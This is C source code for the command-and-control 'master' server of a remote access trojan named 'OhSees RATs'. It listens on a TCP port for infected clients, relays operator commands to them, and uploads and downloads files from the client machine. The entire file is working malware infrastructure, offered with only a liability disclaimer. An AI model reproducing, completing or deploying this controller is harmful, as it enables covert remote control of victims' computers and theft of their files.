/*
C Master server for the OhSees RATs (*nix)
Author: BenTheCyberOne
Current Version: 1.0.0
Blog: https://thissiteissafe.com
DO NOT USE WITHOUT AUTHORIZED CONSENT OR PERMISSION. I AM NOT LIABLE FOR ANY MALICIOUS WRONGDOINGS. YOU HAVE BEEN WARNED.
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h> //string functions
#include <sys/socket.h> //socket
#include <sys/stat.h> // stat
#include <arpa/inet.h> //inet_addr
#include <unistd.h> //write to client

#define BUFFSIZE 524288000

static int downloadCommand(int s);
static int uploadCommand(int s);
static int sendData(int s, char *data);
static int sendFileData(int s, char *data, int size);
static int getFileSize(char path[]);

int getFileSize(char path[]){
  FILE *file;
  int result,statResult;
  struct stat fileStat;
  puts(path);
  statResult = (stat(path,&fileStat));
  if(statResult != 0){
    puts("failed stat\n");
    return 0;
  }
  result = fileStat.st_size;
  return result;
}

int uploadCommand(int s){
  char path[1000], uploadPath[1000], sendCommand[1006], fileSizeStr[15];
  int recvResult, upload_fileSize;
  unsigned char *upload_fileBuff;
  FILE *fp;
  printf("Please enter the path of the file you wish to upload: ");
  if(fgets(path,1000,stdin) != NULL){
    printf("You entered the path: %s\n",path);
  }
  printf("Please enter the path on the client you wish to upload to (include the file name and extention): ");
  if(fgets(uploadPath,1000,stdin) != NULL){
    printf("Uploading to this path: %s\n",uploadPath);
  }
  path[strcspn(path,"\n")] = 0;
  upload_fileSize = getFileSize(path);
  //printf("local file size: %d\n",upload_fileSize);
  if(upload_fileSize == 0){
    printf("Failed to get size of local file to upload. Check your path.%c",10);
    return 1;
  }
  strcpy(sendCommand, "upload ");
  strcat(sendCommand, uploadPath);
  int result = sendData(s, sendCommand);
  if(result != 0){
    return 1;
  }
  fileSizeStr[0] = '\0';
  sprintf(fileSizeStr,"%d",upload_fileSize);
  result = sendData(s,fileSizeStr);
  if(result != 0){
    return 1;
  }
  //Why do we sleep here? With the current setup, a race-like condition within the TCP stream between this and winsock2 morphs the way our file data is sent
  //(This bug took many, many days to figure out)
  sleep(4);
  if((upload_fileBuff = calloc(upload_fileSize+1,1)) == NULL){
    printf("Failed to allocate the upload buffer%c",10);
    return 1;
  }
  fp = fopen(path,"rb");
  if (fp == NULL){
    printf("We were unable to open the file: %s\n",path);
    free(upload_fileBuff);
    return 1;
  }
  if(fread(upload_fileBuff, sizeof *upload_fileBuff, upload_fileSize, fp) != upload_fileSize){
    printf("Failed to read local file to buffer. Be sure you have the correct permissions.%c",10);
    free(upload_fileBuff);
    fclose(fp);
    return 1;
  }
  /* DEBUG:
  for (int i = 0; i < upload_fileSize; i++){
    printf("%02x", upload_fileBuff[i]);
  }
  */
  result = sendFileData(s,upload_fileBuff,upload_fileSize);
  if(result != 0){
    fclose(fp);
    free(upload_fileBuff);
    return 1;
  }
  fclose(fp);
  free(upload_fileBuff);
  return 0;

}

int downloadCommand(int s){
  char path[1000],sendCommand[1009],savePath[1000],reply_fileSize[15];
  int recvResult, download_fileSize;
  unsigned char *download_fileBuff;
  FILE *fp;
  printf("Please enter the path of the file on the client to download: ");
  if(fgets(path,1000,stdin) != NULL){
    printf("You entered the path: %s\n",path);
  }
  printf("Save file as what? (Will be saved in running directory): ");
  if(fgets(savePath,1000,stdin) != NULL){
    printf("Saving file as: %s\n",savePath);
  }
  //Span the save path to remove newline \n
  savePath[strcspn(savePath,"\n")] = 0;
  strcpy(sendCommand, "download ");
  strcat(sendCommand, path);
  int result = sendData(s,sendCommand);
  if(result != 0){
    return 1;
  }
  //reply_fileSize[0] = '\0';
  //Zero out the fileSize buffer for the socket recv read
  memset(&reply_fileSize, 0, 15);
  if ((recvResult = recv(s,reply_fileSize,15,0)) == -1){
    printf("Failed to recv from client%c",10);
    return 1;
  }
  //printf("reply_fileSize is: %s\n",reply_fileSize);
  download_fileSize = atoi(reply_fileSize);
  if(download_fileSize == 0){
    printf("File size was 0. Either the file doesn't exist or is empty%c", 10);
    return 1;
  }
  printf("Got file size of: %u\n",download_fileSize);
  if((download_fileBuff = calloc(download_fileSize+1, 1)) == NULL){
    printf("Failed to create file buffer with size: %u", download_fileSize);
    return 1;
  }
  if ((recvResult = recv(s,download_fileBuff, download_fileSize,0)) == -1){
    printf("Failed to recieve the file data.%c",10);
    free(download_fileBuff);
    return 1;
  }
  fp = fopen(savePath, "wb");
  if(fwrite(download_fileBuff,sizeof *download_fileBuff, download_fileSize, fp) != download_fileSize){
    printf("Failed to write buffer to file%c",10);
    fclose(fp);
    free(download_fileBuff);
    return 1;
  }
  printf("File downloaded: %s\n",savePath);
  fclose(fp);
  free(download_fileBuff);
  return 0;
}

int sendData(int s, char *data){
  if(send(s,data,strlen(data),0) < 0){
    printf("We couldn't send the data: %s",data);
    return 1;
  }
  //printf("Command sent was:%s\n", data);
  return 0;
}

int sendFileData(int s, char *data, int size){;
  if(send(s,data,size,0) < 0){
    printf("We couldn't send the file data%c",10);
    return 1;
  }
  printf("We uploaded the file!%c",10);
  return 0;
}

int main(int argc, char *argv[]){
  int port, s, new_sock, addrlen, recv_size, client_port, sendResult;
  struct sockaddr_in server, client;
  char command[2000], *client_ip, *client_reply;
  unsigned char *downloadBuff;

  if(argc < 2){
    printf("Please supply a port to listen on. Usage: ./master PORT%c",10);
    return 1;
  }
  else if(argc > 2){
    printf("Error: Too many arguments. Usage: ./master PORT%c",10);
    return 1;
  }
  else if(argc == 2){
    port = atoi(argv[1]);
    if(port < 1 || port > 65535){
      printf("Error: Port must be between 1 and 65535%c",10);
      return 1;
    }
    else{
      printf("Port chosen: %d\n",port);
    }
  }
  //Create the socket
  s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if(s == -1){
    printf("Failed to create socket\n");
    return 1;
  }
  //zero out server
  memset(&server,0, sizeof server);
  server.sin_family = AF_INET;
  server.sin_addr.s_addr = INADDR_ANY;
  server.sin_port = htons(port);
  //Multi-threading is planned for version 1.2.0, so we setup out constant listening like so:
  //Bind the socket
  if(bind(s,(struct sockaddr *)&server, sizeof(server)) < 0){
    printf("Failed to bind the socket%c",10);
    return 1;
  }
    listen(s,3);
    //Accept incoming connection from client
    printf("Waiting for connections to come in...%c",10);
    addrlen = sizeof(struct sockaddr_in);
    while (new_sock = accept(s,(struct sockaddr*)&client, (socklen_t*)&addrlen)){
      if((client_reply = malloc(BUFFSIZE+1)) == NULL){
        printf("Failed to create reply buffer with malloc of size: %u", BUFFSIZE);
        exit(1);
      }
      printf("Connection accepted!%c",10);
      client_ip = inet_ntoa(client.sin_addr);
      client_port = ntohs(client.sin_port);
      printf("CLIENT IP: %s\n", client_ip);
      printf("CLIENT PORT: %d\n", client_port);
      for(;;){
        if ((recv_size = recv(new_sock,client_reply,BUFFSIZE,0)) == -1){
          printf("Failed to recv from client: %s\n",client_ip);
          break;
        }
        client_reply[recv_size] = '\0';
        printf("RECV SIZE: %d\n",recv_size);
        //puts(client_reply);
        printf("CLIENT REPLY: \n%s\n",client_reply);
        command[0] = '\0';
        if(fgets(command,2000,stdin) != NULL){
          printf("Your command was: %s\n",command);
        }
        if(strstr(command,"download")){
          int result = downloadCommand(new_sock);
          if(result != 0){
            printf("Failed to download file. Error was printed above. Don't forget to check file permissions!%c",10);
          }
          printf("Download finished!%c",10);
          //sleep(5);
          //sendData(new_sock,"1");
        }
        else if(strstr(command,"upload")){
          int result = uploadCommand(new_sock);
          if(result != 0){
            printf("Failed to upload file. Error was printed above. Don't forget to check directory permissions!%c",10);
          }
          printf("Upload finished!%c",10);
          //sendData(new_sock,"1");
        }
        else{
          sendResult = sendData(new_sock,command);
          if(sendResult != 0){
          printf("We failed to send the command: %s\n", command);
          break;
        }
        printf("Command sent!%c",10);
      }
      /*
      if(send(new_sock,command,strlen(command),0) < 0){
        printf("We couldn't send the data: %s",command);
      }
      */

    }
  }

  if (new_sock < 0){
     printf("Accept has FAILED%c",10);
    return 1;
  }
  close(s);
  free(client_reply);
  return 0;
}
